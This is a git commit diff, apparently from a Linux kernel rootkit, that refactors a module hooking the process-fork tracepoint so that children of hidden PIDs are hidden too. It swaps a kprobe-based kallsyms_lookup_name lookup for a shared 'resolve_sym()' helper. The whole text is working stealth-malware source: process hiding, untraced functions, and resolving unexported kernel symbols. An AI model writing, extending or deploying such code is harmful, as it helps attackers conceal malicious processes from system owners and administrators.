b267b29d4bf06d792e9c8887312aeb0e38d0491c
B Horn <b@horn.uk>
2025-11-07 04:39:43 +0000

    use `resolve_sym()` in `trace.c`
    It previously had a custom implementation.
    
    Signed-off-by: B Horn <b@horn.uk>

--- modules/trace.c
+++ modules/trace.c
@@ -1,37 +1,23 @@
 #include "../include/core.h"
 #include "../include/trace.h"
 #include "../include/hidden_pids.h"
+#include "../ftrace/ftrace_helper.h"
 
 static struct tracepoint *tp_sched_fork;
 static int (*_probe_register)(struct tracepoint *, void *, void *);
 static int (*_probe_unregister)(struct tracepoint *, void *, void *);
-
-static struct kprobe kp = {
-	.symbol_name = "kallsyms_lookup_name"
-};
-
-static unsigned long (*_kallsyms_lookup_name)(const char *name);
 
 notrace static void on_fork_handler(void *data, struct task_struct *parent, struct task_struct *child)
 {
     if (is_hidden_pid(parent->pid) || is_child_pid(parent->pid))
 	add_child_pid(child->pid);
 }
-static void *get_symbol(const char *name)
-{
-    if (!_kallsyms_lookup_name) {
-        register_kprobe(&kp);
-        _kallsyms_lookup_name = (void *)kp.addr;
-        unregister_kprobe(&kp);
-    }
-    return (void *)_kallsyms_lookup_name(name);
-}
 
 notrace int trace_pid_init(void)
 {
-    _probe_register = get_symbol("tracepoint_probe_register");
-    _probe_unregister = get_symbol("tracepoint_probe_unregister");
-    tp_sched_fork = get_symbol("__tracepoint_sched_process_fork");
+    _probe_register = (void *)resolve_sym("tracepoint_probe_register");
+    _probe_unregister = (void *)resolve_sym("tracepoint_probe_unregister");
+    tp_sched_fork = (void *)resolve_sym("__tracepoint_sched_process_fork");
 
     if (tp_sched_fork && _probe_register)
         _probe_register(tp_sched_fork, on_fork_handler, NULL);
